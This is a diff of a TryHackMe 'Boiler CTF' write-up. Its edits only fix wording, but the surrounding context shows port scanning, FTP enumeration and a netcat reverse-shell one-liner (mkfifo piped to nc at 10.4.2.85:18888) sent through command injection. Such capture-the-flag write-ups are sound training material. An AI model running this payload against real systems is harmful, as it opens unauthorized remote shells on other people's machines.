@@ -30,7 +30,7 @@ Boiler CTF - Intermediate level CTF
 
 <!-- TOC -->
 
-- [TryHackMeTHM - Boiler CTF - WriteUp](#tryhackmethm---boiler-ctf---writeup)
+- [TryHackMe(THM) - Boiler CTF - WriteUp](#tryhackmethm---boiler-ctf---writeup)
     - [Table of Contents](#table-of-contents)
     - [Let's Begin Here !!!](#lets-begin-here-)
     - [Task 1 - Questions #1](#task-1---questions-1)
@@ -58,7 +58,7 @@ Fire up basic rustscan (nmap):
 
 ![1-2](img/1-2.png)
 
-<details><summary>Rustscan</summary>
+<details><summary>Rustscan result</summary>
 
 ```text
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
@@ -140,7 +140,7 @@ Nmap done: 1 IP address (1 host up) scanned in 40.87 seconds
 
 </details>
 
-Enumerate FTP as rustscan result show port 21:
+Enumerating FTP as rustscan result show port 21 open:
 
 ![2](img/2.png)
 
@@ -148,7 +148,7 @@ From the FTP we saw `.info.txt`, checking the content shown in below:
 
 ![3-1](img/3-1.png)
 
-From the content, it look like rot13, decoding using dcode.fr and result shown as below:
+From the content, it's look like rot13, decoding using dcode.fr and result shown as below:
 
 ![3-2](img/3-2.png)
 
@@ -227,7 +227,7 @@ Since we have command execution ability, we can spawn a reverse shell using payl
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.2.85 18888 >/tmp/f
 ```
 
-Since, this is part of URL; to avoid bad interpretation of space or special character, we use URL encode to encode our payload
+As this is part of URL; to avoid bad interpretation of space or special character, we use URL encode to encode our payload
 
 ![10-1](img/10-1.png)
 
@@ -255,7 +255,7 @@ And here we have stabilized reverse shell access:
 
 ![10-3](img/10-3.png)
 
-Next, we starting enumerate the system and found `log.txt` in the current directory.
+Next, we start enumerate the system and found `log.txt` in the current directory.
 
 Checking the content of `log.txt`, we found an user credential.
 
